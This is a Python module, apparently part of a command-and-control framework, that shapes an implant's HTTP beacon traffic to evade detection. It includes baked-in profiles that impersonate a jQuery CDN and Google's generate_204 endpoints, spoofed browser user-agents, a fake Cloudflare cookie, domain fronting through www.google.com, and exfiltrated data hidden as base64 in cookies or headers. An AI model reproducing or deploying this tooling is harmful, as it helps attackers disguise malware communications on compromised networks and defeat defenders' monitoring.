"""
Malleable C2 profile engine for Lucy agent.

Allows the HTTP beacon loop to shape traffic according to a configurable
profile instead of a hardcoded request format.  Profiles control URIs,
verbs, headers, user-agent, cookie names, and body encoding strategy.

Data can be embedded in:
  - URI parameters
  - Cookies
  - Custom headers
  - Request body

Uses only the Python standard library so the agent stays dependency-free.
"""
import base64
import json
import logging
import os
import urllib.parse

logger = logging.getLogger("lucy_agent.malleable")

# ---------------------------------------------------------------------------
# Encoding strategies for request bodies
# ---------------------------------------------------------------------------

ENCODING_JSON = "json"
ENCODING_FORM = "form-urlencoded"
ENCODING_COOKIE = "base64-in-cookie"
ENCODING_HEADER = "base64-in-header"

_VALID_ENCODINGS = (
    ENCODING_JSON,
    ENCODING_FORM,
    ENCODING_COOKIE,
    ENCODING_HEADER,
)

# ---------------------------------------------------------------------------
# Profile dataclass (stdlib-only, no dataclasses import needed for compat)
# ---------------------------------------------------------------------------


class MalleableProfile:
    """A malleable C2 profile describing how HTTP traffic should be shaped."""

    __slots__ = (
        "name",
        "http_get_uri",
        "http_post_uri",
        "http_get_verb",
        "http_post_verb",
        "user_agent",
        "custom_headers",
        "cookie_name",
        "stage_uri",
        "jitter_seconds",
        "max_retries",
        "ssl_cert_hash",
        "redirector_url",
        "domain_front_host",
        "body_encoding",
        "data_param",
        "task_param",
    )

    def __init__(
        self,
        name: str = "http_default",
        http_get_uri: str = "/api/v1/agents/{agent_id}/tasks",
        http_post_uri: str = "/api/v1/tasks/{task_id}/result",
        http_get_verb: str = "GET",
        http_post_verb: str = "POST",
        user_agent: str = "",
        custom_headers: dict | None = None,
        cookie_name: str = "",
        stage_uri: str = "/api/v1/stage",
        jitter_seconds: float = 2.0,
        max_retries: int = 5,
        ssl_cert_hash: str = "",
        redirector_url: str = "",
        domain_front_host: str = "",
        body_encoding: str = ENCODING_JSON,
        data_param: str = "d",
        task_param: str = "t",
    ) -> None:
        self.name = name
        self.http_get_uri = http_get_uri
        self.http_post_uri = http_post_uri
        self.http_get_verb = http_get_verb
        self.http_post_verb = http_post_verb
        self.user_agent = user_agent
        self.custom_headers = custom_headers or {}
        self.cookie_name = cookie_name
        self.stage_uri = stage_uri
        self.jitter_seconds = jitter_seconds
        self.max_retries = max_retries
        self.ssl_cert_hash = ssl_cert_hash
        self.redirector_url = redirector_url
        self.domain_front_host = domain_front_host
        if body_encoding not in _VALID_ENCODINGS:
            raise ValueError(
                f"body_encoding must be one of {_VALID_ENCODINGS}, got '{body_encoding}'"
            )
        self.body_encoding = body_encoding
        self.data_param = data_param
        self.task_param = task_param

    # -- serialisation helpers ------------------------------------------------

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "http_get_uri": self.http_get_uri,
            "http_post_uri": self.http_post_uri,
            "http_get_verb": self.http_get_verb,
            "http_post_verb": self.http_post_verb,
            "user_agent": self.user_agent,
            "custom_headers": self.custom_headers,
            "cookie_name": self.cookie_name,
            "stage_uri": self.stage_uri,
            "jitter_seconds": self.jitter_seconds,
            "max_retries": self.max_retries,
            "ssl_cert_hash": self.ssl_cert_hash,
            "redirector_url": self.redirector_url,
            "domain_front_host": self.domain_front_host,
            "body_encoding": self.body_encoding,
            "data_param": self.data_param,
            "task_param": self.task_param,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "MalleableProfile":
        return cls(**{k: v for k, v in d.items() if k in cls.__slots__})

    def __repr__(self) -> str:  # pragma: no cover - debug only
        return f"MalleableProfile(name={self.name!r}, encoding={self.body_encoding!r})"


# ---------------------------------------------------------------------------
# Baked default profiles
# ---------------------------------------------------------------------------

_DEFAULT_PROFILES: dict[str, dict] = {
    "http_default": {
        "name": "http_default",
        "http_get_uri": "/api/v1/agents/{agent_id}/tasks",
        "http_post_uri": "/api/v1/tasks/{task_id}/result",
        "http_get_verb": "GET",
        "http_post_verb": "POST",
        "user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "custom_headers": {},
        "cookie_name": "",
        "stage_uri": "/api/v1/stage",
        "jitter_seconds": 2.0,
        "max_retries": 5,
        "ssl_cert_hash": "",
        "redirector_url": "",
        "domain_front_host": "",
        "body_encoding": ENCODING_JSON,
        "data_param": "d",
        "task_param": "t",
    },
    "https_cdn": {
        "name": "https_cdn",
        "http_get_uri": "/cdn/assets/jquery.min.js",
        "http_post_uri": "/cdn/upload",
        "http_get_verb": "GET",
        "http_post_verb": "POST",
        "user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "custom_headers": {
            "Accept": "application/javascript, text/javascript, */*",
            "X-Cache-Status": "MISS",
            "X-Forwarded-For": "203.0.113.42",
        },
        "cookie_name": "__cf_bm",
        "stage_uri": "/cdn/static/bundle.js",
        "jitter_seconds": 5.0,
        "max_retries": 8,
        "ssl_cert_hash": "",
        "redirector_url": "",
        "domain_front_host": "",
        "body_encoding": ENCODING_COOKIE,
        "data_param": "v",
        "task_param": "i",
    },
    "google_front": {
        "name": "google_front",
        "http_get_uri": "/generate_204",
        "http_post_uri": "/gen_204",
        "http_get_verb": "GET",
        "http_post_verb": "POST",
        "user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) "
            "Gecko/20100101 Firefox/125.0"
        ),
        "custom_headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
        },
        "cookie_name": "NID",
        "stage_uri": "/client_204",
        "jitter_seconds": 3.0,
        "max_retries": 10,
        "ssl_cert_hash": "",
        "redirector_url": "",
        "domain_front_host": "www.google.com",
        "body_encoding": ENCODING_HEADER,
        "data_param": "q",
        "task_param": "s",
    },
}


# ---------------------------------------------------------------------------
# Profile loading
# ---------------------------------------------------------------------------


def load_profile(name: str) -> MalleableProfile:
    """
    Load a malleable profile by name.

    Resolution order:
      1. Baked default profiles (http_default, https_cdn, google_front)
      2. JSON file on disk — ``<name>.profile.json`` next to this module or in
         the current working directory.

    Falls back to ``http_default`` if the name cannot be resolved.
    """
    # 1. baked defaults
    if name in _DEFAULT_PROFILES:
        return MalleableProfile.from_dict(_DEFAULT_PROFILES[name])

    # 2. JSON file on disk
    candidates = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), f"{name}.profile.json"),
        os.path.join(os.getcwd(), f"{name}.profile.json"),
    ]
    for path in candidates:
        if os.path.isfile(path):
            try:
                with open(path, "r", encoding="utf-8") as fh:
                    data = json.load(fh)
                if "name" not in data:
                    data["name"] = name
                logger.info("Loaded profile '%s' from %s", name, path)
                return MalleableProfile.from_dict(data)
            except Exception as exc:
                logger.warning("Failed to load profile file '%s': %s", path, exc)
                break

    logger.warning("Profile '%s' not found — falling back to http_default", name)
    return MalleableProfile.from_dict(_DEFAULT_PROFILES["http_default"])


def list_default_profiles() -> list[str]:
    """Return the names of all baked-in default profiles."""
    return list(_DEFAULT_PROFILES.keys())


# ---------------------------------------------------------------------------
# Request transformation
# ---------------------------------------------------------------------------


def apply_profile(request_params: dict, profile: MalleableProfile) -> dict:
    """
    Transform a set of HTTP request parameters according to *profile*.

    *request_params* is a dict with keys:
        method, url, headers (dict), data (dict | None), timeout (int)

    Returns a new dict with profile-shaped method, url, headers, and body.
    """
    out: dict = {
        "method": request_params.get("method", "GET"),
        "url": request_params.get("url", ""),
        "headers": dict(request_params.get("headers") or {}),
        "body": None,
        "timeout": request_params.get("timeout", 30),
    }

    # Override verb from profile when the caller hasn't pinned one
    method_upper = out["method"].upper()
    if method_upper == "GET":
        out["method"] = profile.http_get_verb
    elif method_upper == "POST":
        out["method"] = profile.http_post_verb

    # User-agent
    if profile.user_agent:
        out["headers"]["User-Agent"] = profile.user_agent

    # Custom headers
    for k, v in profile.custom_headers.items():
        out["headers"][k] = v

    # Domain fronting — set Host header to the front host while keeping the
    # real URL pointed at the redirector / CDN edge.
    if profile.domain_front_host:
        out["headers"]["Host"] = profile.domain_front_host

    # Body encoding
    data = request_params.get("data")
    if data is not None:
        out["body"] = build_post_body(profile, data)
        # Adjust content-type based on encoding
        if profile.body_encoding == ENCODING_JSON:
            out["headers"].setdefault("Content-Type", "application/json")
        elif profile.body_encoding == ENCODING_FORM:
            out["headers"].setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif profile.body_encoding in (ENCODING_COOKIE, ENCODING_HEADER):
            # Body is empty when data is embedded in cookie / header
            out["body"] = None

    return out


# ---------------------------------------------------------------------------
# URI / body builders
# ---------------------------------------------------------------------------


def build_get_uri(profile: MalleableProfile, task_id: str = "") -> str:
    """
    Build the GET URI for polling tasks.

    Replaces ``{agent_id}`` / ``{task_id}`` placeholders and appends the
    task identifier as a query parameter when the profile uses a static URI.
    """
    uri = profile.http_get_uri
    # If the URI already contains a placeholder, the caller is expected to
    # substitute it before calling.  Here we only append a query param.
    if task_id and "{task_id}" not in uri and profile.task_param:
        sep = "&" if "?" in uri else "?"
        uri = f"{uri}{sep}{profile.task_param}={urllib.parse.quote(task_id)}"
    return uri


def build_post_body(profile: MalleableProfile, data: dict) -> bytes:
    """
    Encode *data* according to the profile's body_encoding strategy.

    Returns bytes ready for use as an HTTP request body, or b"" when the
    data is embedded in a cookie or header (caller must handle that case).
    """
    raw = json.dumps(data).encode("utf-8")

    if profile.body_encoding == ENCODING_JSON:
        return raw

    if profile.body_encoding == ENCODING_FORM:
        flat = {k: json.dumps(v) if isinstance(v, (dict, list)) else str(v) for k, v in data.items()}
        return urllib.parse.urlencode(flat).encode("utf-8")

    if profile.body_encoding == ENCODING_COOKIE:
        # Data is base64-encoded and placed in a cookie by the caller.
        # Return empty body — the encoded value is accessible via get_cookie_value().
        return b""

    if profile.body_encoding == ENCODING_HEADER:
        # Data is base64-encoded and placed in a custom header by the caller.
        return b""

    return raw


def get_embedded_value(profile: MalleableProfile, data: dict) -> str | None:
    """
    Return the base64-encoded payload for cookie/header embedding, or None
    when the profile does not use those encodings.
    """
    if profile.body_encoding not in (ENCODING_COOKIE, ENCODING_HEADER):
        return None
    raw = json.dumps(data).encode("utf-8")
    return base64.b64encode(raw).decode("ascii")


def get_cookie_header(profile: MalleableProfile, data: dict) -> str | None:
    """
    Build a ``Cookie:`` header value for profiles that embed data in a cookie.
    Returns None if the profile does not use cookie embedding.
    """
    if profile.body_encoding != ENCODING_COOKIE or not profile.cookie_name:
        return None
    encoded = get_embedded_value(profile, data)
    if encoded is None:
        return None
    return f"{profile.cookie_name}={encoded}"


def get_data_header(profile: MalleableProfile, data: dict) -> tuple[str, str] | None:
    """
    Return (header_name, header_value) for profiles that embed data in a
    custom header.  Returns None if the profile does not use header embedding.
    """
    if profile.body_encoding != ENCODING_HEADER:
        return None
    encoded = get_embedded_value(profile, data)
    if encoded is None:
        return None
    header_name = profile.custom_headers.get("_data_header_name", "X-Data")
    return header_name, encoded


# ---------------------------------------------------------------------------
# Response parsing
# ---------------------------------------------------------------------------


def parse_response(profile: MalleableProfile, raw: bytes) -> dict:
    """
    Decode a C2 HTTP response according to the profile.

    The agent and backend always exchange JSON at the application layer;
    profiles may wrap that JSON in base64 (e.g. inside a fake JS asset) so
    we transparently unwrap it here.
    """
    if not raw:
        return {}

    text = raw.decode("utf-8", errors="replace").strip()

    # CDN profiles sometimes return the payload as a base64 blob inside a
    # comment block or a JS variable assignment.  Try to extract it.
    if profile.body_encoding in (ENCODING_COOKIE, ENCODING_HEADER):
        decoded = _extract_base64(text)
        if decoded is not None:
            try:
                return json.loads(decoded.decode("utf-8"))
            except (json.JSONDecodeError, ValueError):
                pass

    # Default: treat as JSON
    try:
        return json.loads(text)
    except (json.JSONDecodeError, ValueError):
        # Last resort — return raw text wrapped in a dict
        return {"raw": text}


def _extract_base64(text: str) -> bytes | None:
    """Attempt to find and decode a base64 blob inside *text*."""
    # Look for the longest base64-looking substring
    import re

    candidates = re.findall(r"[A-Za-z0-9+/=]{16,}", text)
    for cand in reversed(candidates):  # longest tends to be last
        try:
            decoded = base64.b64decode(cand, validate=True)
            if decoded:
                return decoded
        except Exception:
            continue
    return None
